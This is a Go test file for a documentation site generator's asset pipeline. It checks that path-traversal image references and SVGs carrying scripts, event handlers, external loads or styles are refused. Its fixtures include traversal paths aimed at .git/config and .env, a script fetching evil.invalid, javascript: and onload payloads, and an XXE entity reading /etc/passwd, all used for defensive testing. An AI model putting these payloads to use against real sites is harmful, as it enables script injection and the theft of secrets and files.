package site

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// assetFixture writes one file under a temporary repo root and returns the root.
func assetFixture(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for rel, body := range files {
		abs := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(abs, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

// TestAssetsRefuseAnythingOutsideTheAssetRoot closes the widest hole a
// generator like this has: an image reference is a path, and a path read from
// repository text will happily name a file that is not a picture.
//
// The build publishes what it reads. `![x](../../.git/config)` would therefore
// copy git's config — which on a CI runner carries the checkout token in an
// `http.…extraheader` line — into a directory served to the public, under a
// name nobody would look at twice. The same reference reaches `.env`, and the
// gitignored `.abcd/.work.local/` tier, none of which git would ever show as
// changed, because the output directory is not tracked.
func TestAssetsRefuseAnythingOutsideTheAssetRoot(t *testing.T) {
	root := assetFixture(t, map[string]string{
		".git/config":                     "[core]\n\textraheader = AUTHORIZATION: basic SECRET\n",
		".env":                            "TOKEN=not-a-real-token\n",
		".abcd/.work.local/scratch/n.txt": "local notes\n",
		"docs/assets/img/ok.svg":          `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"></svg>`,
		"docs/explanation/notes.md":       "prose\n",
	})
	pipe := newAssetPipe(root, mustOpenRoot(t, root))
	at := Source{Path: "docs/explanation/page.md", Line: 3}

	for _, src := range []string{
		"../../.git/config",
		"../../.env",
		"../../.abcd/.work.local/scratch/n.txt",
		"../explanation/notes.md",
	} {
		if _, err := pipe.render("docs/explanation", src, "", at); err == nil {
			t.Errorf("%s was published; only committed pictures under the asset root may be", src)
		} else if !strings.Contains(err.Error(), at.Path) {
			t.Errorf("%s: the refusal does not name the page: %v", src, err)
		}
	}

	// The legitimate case still works.
	if _, err := pipe.render("docs/explanation", "../assets/img/ok.svg", "", at); err != nil {
		t.Errorf("a committed asset was refused: %v", err)
	}
}

// TestAssetsRefuseExecutableSVG is the other half of the same boundary. An SVG
// is INLINED — that is the whole point, so its var(--token) colours follow the
// reader's theme — which means its bytes become markup in the published page.
// A `<script>` element or an `on*` attribute inside one is therefore executable
// code on the site's own origin, reached with no click, from a file that is not
// code and that no reviewer reads as code.
func TestAssetsRefuseExecutableSVG(t *testing.T) {
	cases := []struct{ name, svg, says string }{
		{"script element",
			`<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil.invalid/')</script></svg>`,
			"script"},
		{"event handler",
			`<svg xmlns="http://www.w3.org/2000/svg"><rect onload="alert(1)" width="1" height="1"/></svg>`,
			"onload"},
		{"mixed-case event handler",
			`<svg xmlns="http://www.w3.org/2000/svg"><rect OnLoad="alert(1)" width="1" height="1"/></svg>`,
			"onload"},
		{"foreign object",
			`<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"/></foreignObject></svg>`,
			"foreignObject"},
		{"executable href",
			`<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="1" height="1"/></a></svg>`,
			""},
		{"external use",
			`<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.invalid/x.svg#a"/></svg>`,
			"href"},
		{"style element",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil.invalid/x.css);</style></svg>`,
			"style"},
		{"external image panel",
			`<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.invalid/x.png"/></svg>`,
			"image"},
		// The <image> carve-out exists for the committed drawings' raster
		// panels; nesting a document inside one would reopen the surface.
		{"svg inside an image panel",
			`<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4="/></svg>`,
			"image"},
		{"doctype entity",
			`<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><desc>&x;</desc></svg>`,
			""},
		// A prolog, a comment or a CDATA section is inlined verbatim and the
		// emitted page's reader (htmlscan) refuses all three — so the build must
		// refuse them at the asset, not leave the page to fail the check with a
		// message that names no file. Every mainstream SVG exporter writes a prolog
		// and a generator comment.
		{"xml prolog",
			`<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>`,
			"processing instruction"},
		{"generator comment",
			`<svg xmlns="http://www.w3.org/2000/svg"><!-- Generator: Adobe Illustrator --><rect width="1" height="1"/></svg>`,
			"comment"},
		{"cdata section",
			`<svg xmlns="http://www.w3.org/2000/svg"><title><![CDATA[x]]></title><rect width="1" height="1"/></svg>`,
			"cdata"},
	}
	at := Source{Path: "docs/explanation/page.md", Line: 5}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := assetFixture(t, map[string]string{"docs/assets/img/x.svg": c.svg})
			pipe := newAssetPipe(root, mustOpenRoot(t, root))
			out, err := pipe.render("docs/explanation", "../assets/img/x.svg", "", at)
			if err == nil {
				t.Fatalf("inlined an executable SVG into the page:\n%s", out)
			}
			if !strings.Contains(err.Error(), "docs/assets/img/x.svg") {
				t.Errorf("the refusal does not name the asset: %v", err)
			}
			if c.says != "" && !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(c.says)) {
				t.Errorf("the refusal does not say %q: %v", c.says, err)
			}
		})
	}
}

// TestAssetsRefuseStyledSVG is the same boundary read one step further out. A
// drawing that carries no script can still carry a stylesheet, because `style`
// and `class` are attributes, and an inlined drawing's attributes are live
// markup on the page like any others.
//
// Inline CSS on the root wins against `.svgasset svg` and `.card .icon svg`,
// neither of which is `!important`, so a drawing can size itself to the
// viewport; a child can `position:fixed` out of the box the page laid out for
// it, and cover the page it was drawn into. `class` is the same reach by
// another route — it borrows whatever the site's own stylesheet says about that
// name. Neither is a thing a drawing needs: the committed corpus carries paint
// and geometry, and its colours are `var(--token, fallback)` values on the
// paint attributes themselves.
func TestAssetsRefuseStyledSVG(t *testing.T) {
	cases := []struct{ name, svg, says string }{
		{"style on the root",
			`<svg xmlns="http://www.w3.org/2000/svg" style="position:fixed;inset:0;width:100vw;height:100vh"><rect width="1" height="1"/></svg>`,
			"style"},
		{"style on a child",
			`<svg xmlns="http://www.w3.org/2000/svg"><rect style="position:fixed;inset:0" width="1" height="1"/></svg>`,
			"style"},
		{"class on the root",
			`<svg xmlns="http://www.w3.org/2000/svg" class="wrap"><rect width="1" height="1"/></svg>`,
			"class"},
		{"class on a child",
			`<svg xmlns="http://www.w3.org/2000/svg"><g class="hero"><rect width="1" height="1"/></g></svg>`,
			"class"},
		// The allowlist is closed, so an attribute nobody weighed is refused by
		// name rather than passed through for the browser to decide about.
		{"an attribute a drawing is not made of",
			`<svg xmlns="http://www.w3.org/2000/svg"><rect requiredExtensions="x" width="1" height="1"/></svg>`,
			"requiredExtensions"},
		// A namespace declaration is how a foreign vocabulary gets in; a drawing
		// declares SVG, and xlink for the `xlink:href` its <use> elements write.
		{"a foreign namespace declaration",
			`<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml"><rect width="1" height="1"/></svg>`,
			"namespace"},
	}
	at := Source{Path: "docs/explanation/page.md", Line: 7}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := assetFixture(t, map[string]string{"docs/assets/img/x.svg": c.svg})
			pipe := newAssetPipe(root, mustOpenRoot(t, root))
			out, err := pipe.render("docs/explanation", "../assets/img/x.svg", "", at)
			if err == nil {
				t.Fatalf("inlined a styled SVG into the page:\n%s", out)
			}
			if !strings.Contains(err.Error(), "docs/assets/img/x.svg") {
				t.Errorf("the refusal does not name the asset: %v", err)
			}
			if c.says != "" && !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(c.says)) {
				t.Errorf("the refusal does not say %q: %v", c.says, err)
			}
		})
	}
}

// TestAssetsAcceptDrawings keeps the refusal from swallowing the real corpus:
// the shapes, gradients, clip paths and text the committed drawings are made of
// stay renderable, and a same-document reference is not an external one.
func TestAssetsAcceptDrawings(t *testing.T) {
	svg := `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10" width="10" height="10">
<title>A drawing</title><desc>Described</desc>
<defs><clipPath id="c"><rect width="10" height="10"/></clipPath>
<marker id="m" markerWidth="4" markerHeight="4" refX="2" refY="2" orient="auto"><path d="M0 0 L4 2 L0 4 z"/></marker>
<linearGradient id="g"><stop offset="0" stop-color="var(--accent, #06c)"/></linearGradient></defs>
<g clip-path="url(#c)"><circle cx="5" cy="5" r="4" fill="var(--ink, #000)"/>
<path d="M0 0 L10 10" stroke="url(#g)" marker-end="url(#m)"/>
<text x="1" y="9" font-family="sans-serif" font-size="2">hi<tspan dy="1">there</tspan></text>
<use xlink:href="#c"/></g></svg>`
	root := assetFixture(t, map[string]string{"docs/assets/img/x.svg": svg})
	pipe := newAssetPipe(root, mustOpenRoot(t, root))
	out, err := pipe.render("docs/explanation", "../assets/img/x.svg", "", Source{Path: "p.md", Line: 1})
	if err != nil {
		t.Fatalf("a drawing was refused: %v", err)
	}
	if !strings.Contains(out, "var(--ink, #000)") {
		t.Error("the token colours did not survive inlining")
	}
	// The root is sized by the stylesheet; the clip path's rect is not, and
	// TestAssetsStripOnlyTheRootDrawingSize is where that split is pinned.
	if strings.Contains(out, `viewBox="0 0 10 10" width="10"`) {
		t.Error("the stylesheet must size the drawing; the root's own width survived")
	}
}

// TestAssetsStripOnlyTheRootDrawingSize pins the one attribute pair the build
// is allowed to take away, and the elements it must not take it away from.
//
// The ROOT <svg> is sized by the stylesheet, so its width and height go. Every
// other element's width and height ARE the drawing: a <rect> is a box of that
// size, an <image> panel is a raster framed to that size and clipped to it, and
// a <use>, <pattern>, <mask> or <symbol> establishes a region of that size.
// Dropping those does not resize a drawing, it destroys it — an <image> falls
// back to its raster's intrinsic pixel size and bursts out of the clip path it
// was framed by, and a <rect> collapses to nothing at all.
func TestAssetsStripOnlyTheRootDrawingSize(t *testing.T) {
	svg := `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
<defs><clipPath id="cp"><circle cx="21" cy="21" r="21"/></clipPath>
<pattern id="pt" width="8" height="8" patternUnits="userSpaceOnUse"><line x1="0" y1="0" x2="8" y2="8"/></pattern>
<mask id="mk" width="30" height="30"><rect width="30" height="30" fill="#fff"/></mask>
<symbol id="sy" width="12" height="12"><rect width="12" height="12"/></symbol></defs>
<rect x="4" y="4" width="92" height="34" rx="7" fill="var(--surface, #fff)"/>
<image href="data:image/webp;base64,AAAA" x="10" y="10" width="42" height="42" clip-path="url(#cp)" preserveAspectRatio="xMidYMid slice"/>
<use href="#sy" x="60" y="60" width="12" height="12"/></svg>`
	root := assetFixture(t, map[string]string{"docs/assets/img/x.svg": svg})
	pipe := newAssetPipe(root, mustOpenRoot(t, root))
	out, err := pipe.render("docs/explanation", "../assets/img/x.svg", "", Source{Path: "p.md", Line: 1})
	if err != nil {
		t.Fatalf("a drawing was refused: %v", err)
	}

	// The root, and only the root, loses its size.
	rootTag := out[strings.Index(out, "<svg"):]
	rootTag = rootTag[:strings.Index(rootTag, ">")+1]
	if strings.Contains(rootTag, "width=") || strings.Contains(rootTag, "height=") {
		t.Errorf("the stylesheet must size the drawing; the root kept its own size: %s", rootTag)
	}
	if !strings.Contains(rootTag, `viewBox="0 0 100 100"`) {
		t.Errorf("the root lost its viewBox, which is the coordinate system: %s", rootTag)
	}

	// Every other element keeps the size that IS the drawing.
	for _, want := range []string{
		`<pattern id="pt" width="8" height="8"`,
		`<mask id="mk" width="30" height="30"`,
		`<symbol id="sy" width="12" height="12"`,
		`<rect width="30" height="30" fill="#fff"/>`,
		`<rect width="12" height="12"/>`,
		`<rect x="4" y="4" width="92" height="34"`,
		`x="10" y="10" width="42" height="42" clip-path="url(#cp)"`,
		`<use href="#sy" x="60" y="60" width="12" height="12"/>`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("the inlined drawing lost a size that is part of it: want %s", want)
		}
	}
}

// TestAssetsStripTouchesTheRootTagAlone pins the boundary of the replaced
// region itself. The size strip is a text substitution, so the bytes it is
// allowed to see are the whole of its correctness: given the document rather
// than the root start tag, it edits whatever else happens to read like a size —
// which is the shape of the bug it was written to end, one level up.
func TestAssetsStripTouchesTheRootTagAlone(t *testing.T) {
	svg := `keep width="1" me<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4" width="4" height="4"><rect width="2" height="2"/></svg>`
	root := assetFixture(t, map[string]string{"docs/assets/img/x.svg": svg})
	pipe := newAssetPipe(root, mustOpenRoot(t, root))
	out, err := pipe.render("docs/explanation", "../assets/img/x.svg", "", Source{Path: "p.md", Line: 1})
	if err != nil {
		t.Fatalf("a drawing was refused: %v", err)
	}
	if !strings.Contains(out, `keep width="1" me`) {
		t.Errorf("the strip reached past the root start tag, into what precedes it:\n%s", out)
	}
	if !strings.Contains(out, `<rect width="2" height="2"/>`) {
		t.Errorf("the strip reached past the root start tag, into the drawing:\n%s", out)
	}
	if strings.Contains(out, `viewBox="0 0 4 4" width="4"`) {
		t.Errorf("the root kept its own size:\n%s", out)
	}
}

// TestCommittedSVGAssetsAreDrawings runs the same refusal over every SVG this
// repository actually carries, so an asset that could never be published is
// caught when it lands rather than when a page first references it.
//
// It is also the anti-vacuity guard on the attribute allowlist. A closed list
// is only as good as the evidence it was drawn from, and the cheapest way to
// write one that refuses nothing real is to write one that refuses everything
// real: every committed drawing goes through the whole pipeline here, not just
// the parse, so an attribute the corpus carries and the list forgot fails this
// test rather than the site build.
func TestCommittedSVGAssetsAreDrawings(t *testing.T) {
	repoRoot := filepath.Join("..", "..", "..")
	dir := filepath.Join(repoRoot, "docs", "assets", "img")
	pipe := newAssetPipe(repoRoot, mustOpenRoot(t, repoRoot))
	at := Source{Path: "docs/explanation/page.md", Line: 1}
	var found int
	err := filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(p, ".svg") {
			return err
		}
		found++
		data, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		if err := checkInlinableSVG(string(data), p); err != nil {
			t.Errorf("%v", err)
			return nil
		}
		// The reference as a page would write it: a docs page naming an asset
		// under the asset root, resolved and inlined by the real pipe.
		rel, err := filepath.Rel(filepath.Join(repoRoot, "docs"), p)
		if err != nil {
			return err
		}
		out, err := pipe.render("docs", filepath.ToSlash(rel), "", at)
		if err != nil {
			t.Errorf("a committed drawing no longer inlines: %v", err)
			return nil
		}
		if !strings.Contains(out, "<svg") {
			t.Errorf("%s: the inlined drawing carries no <svg> element", p)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if found == 0 {
		t.Fatal("no SVG assets found; the scan proved nothing")
	}
}
